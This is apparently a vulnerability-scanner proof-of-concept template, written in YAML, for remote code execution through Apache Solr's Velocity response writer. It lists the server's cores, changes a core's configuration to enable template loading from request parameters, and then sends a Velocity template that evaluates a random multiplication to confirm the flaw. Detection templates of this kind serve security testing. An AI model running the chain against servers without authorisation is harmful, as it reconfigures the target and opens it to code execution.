id: poc-yaml-solr-velocity-template-rce
info:
  name: Solr Velocity Template 远程代码执行漏洞
  severity: critical
  tags:
  - rce
  finger: Solr
  reference: []
  description: null
variables:
  r1: random_int(500, 999)
  r2: random_int(500, 999)
transport: http
requests:
- method: GET
  path: /solr/admin/cores?wt=json
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "responseHeader")
  output:
  - regex_match(body,"\"name\":\"(?P<core>[^\"]+)\"")
- method: POST
  path: /solr/{{.core}}/config
  headers:
    Content-Type: application/json
  data: "{\n  \"update-queryresponsewriter\": {\n    \"startup\": \"test\",\n    \"\
    name\": \"velocity\",\n    \"class\": \"solr.VelocityResponseWriter\",\n    \"\
    template.base.dir\": \"\",\n    \"solr.resource.loader.enabled\": \"true\",\n\
    \    \"params.resource.loader.enabled\": \"true\"\n  }\n}"
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200
  output: []
- method: GET
  path: /solr/{{.core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{{.r1}}%20*%20{{.r2}})%24c
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: contains(body, r1 * r2)
  output: []
